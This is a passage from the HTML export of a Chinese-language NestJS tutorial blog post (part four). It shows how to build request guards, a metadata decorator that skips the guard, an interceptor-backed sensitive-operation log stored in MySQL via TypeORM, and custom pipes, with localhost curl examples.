class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>query 的第二个参数是 pipes, 也可以使用多个 pipes 对数据连续处理</p><h2 id=\"调用接口\"><a href=\"#调用接口\" class=\"headerlink\" title=\"调用接口\"></a>调用接口</h2><p>再浏览器访问<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">http://localhost:3000/students/who-are-you?name=gdccwxx</span><br><span class=\"line\">// =&gt; Im student 🇨🇳 gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>这样就实现了简单版本的数据转换了！</p><h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>至此，NestJs 的入门篇章就结束了。</p><p>简单回顾下教程内容：</p><ul><li>通过 <code>nest cli</code> 新建工程、新建模块</li><li>通过 <code>@Get</code> 和 <code>@Post</code> 实现 get、post 请求</li><li>通过 <code>dto</code> 限制对参数进行限制</li><li>自定义 <code>decorator</code> 实现参数获取、设置 <code>metadata</code></li><li>调用内置 <code>log</code> 实现日志规范化</li><li>使用 <code>typeorm</code> 对数据库连接和基础操作，并进行联表操作及查询</li><li>使用 <code>guard</code> 对参数进行校验（可扩展成登录态）</li><li>使用 <code>interceptor</code> 实现敏感数据落地</li><li>使用 <code>pipes</code> 实现数据格式化</li></ul><p>笔者也在 NestJs 逐渐探索中。它不仅包括简单的数据服务，还支持 <code>GraphQL</code>、<code>SSE</code>、<code>Microservice</code> 等等，是综合性非常强的框架。</p><p>btw：这是笔者用这么久以来最喜欢的 Node 框架了</p><p>感谢你的阅读～</p>","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/nestJs/nest-js-tutorial-4/nestjs.png\" alt=\"nestjs\"></p><a href=\"/nestJs/nest-js-tutorial-3/\" title=\"上篇\">上篇</a>文章，实现了 <code>数据库</code> 基础操作 和联表查询。<br><br>本篇是教程的最终篇，虽然我们实现了 NestJs 的基础功能，但是真正的服务器需要做全局的数据核查、敏感操作落库和数据转化。<br><br>拥有这些能力才能让后台能力更加丰富，本篇将主要使用 NestJs 的高级能力，来实现这些功能。<br><br>本篇概要：<br>- 使用 <code>guards</code> 和 <code>decorators</code> 实现数据校验核查<br>- 通过 <code>interceptors</code> 和 <code>decorators</code> 实现敏感操作录入<br>- 自定义 <code>pipes</code> 实现数据转化<br><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><h1 id=\"守卫-Guards\"><a href=\"#守卫-Guards\" class=\"headerlink\" title=\"守卫 Guards\"></a>守卫 Guards</h1><p><img src=\"/nestJs/nest-js-tutorial-4/guards.png\" alt=\"guards\"><br>在 <code>请求到达业务逻辑前</code> 会经过 guard，这样在接口前可以做统一处理。</p><p>例如：检查登陆态、检查权限 …</p><p>需要在业务逻辑前 <code>统一检查</code>\b 的信息，都可以抽象成守卫。</p><p>在真实场景中，大多数的后台管理端会用 <code>JWT</code> 实现接口鉴权。<code>NestJs</code> 也提供了对应的<a href=\"https://docs.nestjs.com/security/authentication\" target=\"_blank\" rel=\"noopener\">解决方案</a>。</p><p>由于较长且原理相通，本篇暂时用校验 <code>user</code> 字段做演示。</p><h2 id=\"新建守卫\"><a href=\"#新建守卫\" class=\"headerlink\" title=\"新建守卫\"></a>新建守卫</h2><p>新建 <code>user.guard.ts</code> 文件</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/guards/user.guard.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable, CanActivate, ExecutionContext, UnauthorizedException &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Observable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'rxjs'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> UserGuard <span class=\"keyword\">implements</span> CanActivate &#123;</span><br><span class=\"line\">  canActivate(</span><br><span class=\"line\">    context: ExecutionContext,</span><br><span class=\"line\">  ): <span class=\"built_in\">boolean</span> | <span class=\"built_in\">Promise</span>&lt;<span class=\"built_in\">boolean</span>&gt; | Observable&lt;<span class=\"built_in\">boolean</span>&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> request = context.switchToHttp().getRequest();</span><br><span class=\"line\">    <span class=\"keyword\">const</span> user = request.body.user;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (user) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UnauthorizedException(<span class=\"string\">'need user field'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><h2 id=\"单个接口使用守卫\"><a href=\"#单个接口使用守卫\" class=\"headerlink\" title=\"单个接口使用守卫\"></a>单个接口使用守卫</h2><p>单个接口使用需要用 <code>@UseGuards</code> 作为引用。再将定义的 <code>UserGuard</code> 作为入参。</p><p>\b在 <code>student.controller.ts</code> 中使用<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;  UseGuards  <span class=\"comment\">/** ... **/</span>&#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; UserGuard &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/guards/user.guard'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@UseGuards</span>(UserGuard)</span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYouPost(<span class=\"meta\">@Body</span>() student: StudentDto) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(student.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>这样当访问 <code>who-are-you</code> 和 <code>who-is-request</code> 就起作用了<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不使用 user</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"name\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; &#123;<span class=\"string\">\"statusCode\"</span>:401,<span class=\"string\">\"message\"</span>:<span class=\"string\">\"need user to distinct\"</span>,<span class=\"string\">\"error\"</span>:<span class=\"string\">\"Unauthorized\"</span>&#125;%  </span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 使用 user</span><br><span class=\"line\">// curl -X POST http://127.0.0.1:3000/students/who-are-you -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx\", \"name\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; Im student gdccwxx%</span><br></pre></td></tr></table></figure><p></p><h2 id=\"全局使用\"><a href=\"#全局使用\" class=\"headerlink\" title=\"全局使用\"></a>全局使用</h2><p>全局使用仅需在 <code>app.module.ts</code> 的 <code>providers</code> 中引入。这样就对全局生效了<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; APP_GUARD &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; UserGuard &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./common/guards/user.guard'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  controllers: [AppController],</span><br><span class=\"line\">  providers: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      provide: APP_GUARD,</span><br><span class=\"line\">      useClass: UserGuard,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">      AppService</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> AppModule &#123;&#125;</span><br></pre></td></tr></table></figure><p></p><p>这时再访问 <code>get</code> 请求 <code>who-are-you</code> 和 <code>post</code> 请求 <code>who-is-request</code><br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ get who-are-you</span><br><span class=\"line\">http://localhost:3000/students/who-are-you?name=gdccwxx</span><br><span class=\"line\">// =&gt; &#123;</span><br><span class=\"line\">// statusCode: 401,</span><br><span class=\"line\">// message: <span class=\"string\">\"need user field\"</span>,</span><br><span class=\"line\">// error: <span class=\"string\">\"Unauthorized\"</span></span><br><span class=\"line\">// &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ post </span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-is-request -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; gdccwxx%</span><br></pre></td></tr></table></figure><p></p><h2 id=\"自定义装饰器过滤\"><a href=\"#自定义装饰器过滤\" class=\"headerlink\" title=\"自定义装饰器过滤\"></a>自定义装饰器过滤</h2><p>总有些接口我们不需要有 <code>user</code> 字段，这时自定义 <code>decorator</code> 就出马了。</p><p>基本原理是：在接口前设置 MetaData, 在服务启动时把 MetaData 写入内存，这样在请求过来时判断有无 MetaData 标签。有则通过，无则校验。</p><p>顺便也将 <code>get</code> 请求类型过滤掉。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// common/decorators.ts</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> NoUser = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> SetMetadata(<span class=\"string\">'no-user'</span>, <span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure><p><code>user.guard.ts</code> 改造</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// user.guard.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Reflector &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ..</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> UserGuard <span class=\"keyword\">implements</span> CanActivate &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> reflector: Reflector</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  canActivate(</span><br><span class=\"line\">    context: ExecutionContext,</span><br><span class=\"line\">  ): <span class=\"built_in\">boolean</span> | <span class=\"built_in\">Promise</span>&lt;<span class=\"built_in\">boolean</span>&gt; | Observable&lt;<span class=\"built_in\">boolean</span>&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> request = context.switchToHttp().getRequest();</span><br><span class=\"line\">    <span class=\"keyword\">const</span> user = request.body.user;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (request.method !== <span class=\"string\">'POST'</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> noCheck = <span class=\"keyword\">this</span>.reflector.get&lt;<span class=\"built_in\">string</span>[]&gt;(<span class=\"string\">'no-user'</span>, context.getHandler());</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (noCheck) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (user) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UnauthorizedException(<span class=\"string\">'need user field'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p><code>NoUser</code> 使用<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; User, NoUser &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/decorators'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ..</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"meta\">@NoUser</span>()</span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYouPost(<span class=\"meta\">@Body</span>() student: StudentDto) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(student.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>再调用时，就不会再校验了。</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"name\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; Im student gdccwxx%</span><br></pre></td></tr></table></figure><p>这样就实现了全局守卫，但是部分接口不需要守卫的情况。</p><p>特别适用于登录态的校验，只有登陆接口不需要登录态，其他接口都需要登陆态或鉴权。</p><h1 id=\"拦截器-Interceptors\"><a href=\"#拦截器-Interceptors\" class=\"headerlink\" title=\"拦截器 Interceptors\"></a>拦截器 Interceptors</h1><p><img src=\"/nestJs/nest-js-tutorial-4/interceptors.png\" alt=\"interceptors\"></p><p>拦截器工作在 <code>请求前</code> 和 <code>响应后</code>。它的原理和 <code>decorator</code> 类似，不同的是能做全局级别。</p><p>它的应用场景也非常广，例如：接口请求参数和请求结果的数据保存、设计模式中的 adapter 模式 等…</p><p>我们来用它实现敏感信息的数据保存。</p><p>它的原理和 <code>guards</code> 类似, 通过 <code>decorator</code> 加载到内存，知道哪些接口需要敏感操作记录，然后在调用接口时将 入参和结果存入。</p><p>涉及到数据库操作，因此需要新增模块和数据库连接。</p><h2 id=\"新建敏感权限模块\"><a href=\"#新建敏感权限模块\" class=\"headerlink\" title=\"新建敏感权限模块\"></a>新建敏感权限模块</h2><p>新建敏感权限模块，包括 controller、module 和 service<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nest g controller sensitive</span><br><span class=\"line\">nest g module sensitive</span><br><span class=\"line\">nest g service sensitive</span><br></pre></td></tr></table></figure><p></p><h2 id=\"创建-entity-文件\"><a href=\"#创建-entity-文件\" class=\"headerlink\" title=\"创建 entity 文件\"></a>创建 entity 文件</h2><p>新建 <code>sensitive.entity.ts</code> 。</p><p>这里会用到 <code>transformer</code>, 原因是 <code>mysql</code> 底层并没有 <code>Object</code> 类型。需要通过 JS 把它存成 <code>string</code> 格式，在读取时用 <code>object</code> 格式。这样代码就不需要感知是啥类型了。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Entity, Column, PrimaryGeneratedColumn, CreateDateColumn &#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// to 写入数据库</span></span><br><span class=\"line\"><span class=\"comment\">// from 从数据库读取</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> dataTransform = &#123;</span><br><span class=\"line\">    to: <span class=\"function\">(<span class=\"params\">value: <span class=\"built_in\">any</span></span>) =&gt;</span> <span class=\"built_in\">JSON</span>.stringify(value || &#123;&#125;),</span><br><span class=\"line\">    <span class=\"keyword\">from</span>: <span class=\"function\">(<span class=\"params\">value: <span class=\"built_in\">any</span></span>) =&gt;</span> <span class=\"built_in\">JSON</span>.parse(value)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Entity</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> Sensitive &#123;</span><br><span class=\"line\">  <span class=\"meta\">@PrimaryGeneratedColumn</span>()</span><br><span class=\"line\">  id: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'enum'</span>, <span class=\"keyword\">enum</span>: SensitiveType &#125;)</span><br><span class=\"line\">  <span class=\"keyword\">type</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'varchar'</span> &#125;)</span><br><span class=\"line\">  pathname: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'text'</span>, transformer: dataTransform &#125;)</span><br><span class=\"line\">  parameters: <span class=\"built_in\">any</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Column</span>(&#123; <span class=\"keyword\">type</span>: <span class=\"string\">'text'</span>, transformer: dataTransform &#125;)</span><br><span class=\"line\">  results: <span class=\"built_in\">any</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@CreateDateColumn</span>()</span><br><span class=\"line\">  createDate: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><h2 id=\"引用数据库\"><a href=\"#引用数据库\" class=\"headerlink\" title=\"引用数据库\"></a>引用数据库</h2><p>和之前介绍数据库一样，在 <code>sensitive.module.ts</code> 中引入数据库<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; Module &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveController &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./sensitive.controller'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./sensitive.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Sensitive &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/sensitive.entity'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; TypeOrmModule &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  controllers: [SensitiveController],</span><br><span class=\"line\">  imports: [TypeOrmModule.forFeature([Sensitive])],</span><br><span class=\"line\">  providers: [Sensitive, SensitiveService],</span><br><span class=\"line\">  exports: [SensitiveService],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> SensitiveModule &#123;&#125;</span><br></pre></td></tr></table></figure><p></p><h2 id=\"service-核心逻辑\"><a href=\"#service-核心逻辑\" class=\"headerlink\" title=\"service 核心逻辑\"></a>service 核心逻辑</h2><p>敏感操作比较简单，service 仅需实现新增和查询。</p><p>先定义敏感操作类型<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/sensitive/constants.ts</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">enum</span> SensitiveType &#123;</span><br><span class=\"line\">    Modify = <span class=\"string\">'Modify'</span>,</span><br><span class=\"line\">    Set = <span class=\"string\">'Set'</span>,</span><br><span class=\"line\">    Create = <span class=\"string\">'Create'</span>,</span><br><span class=\"line\">    Delete = <span class=\"string\">'Delete'</span>,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>在修改 service，引入db操作</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/sensitive/sensitive.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Sensitive &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./entities/sensitive.entity'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; InjectRepository &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Repository &#125; <span class=\"keyword\">from</span> <span class=\"string\">'typeorm'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> SensitiveService &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"meta\">@InjectRepository</span>(Sensitive)</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">private</span> readonly sensitiveRepository: Repository&lt;Sensitive&gt;,</span></span><br><span class=\"line\"><span class=\"params\">    </span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> setSensitive(<span 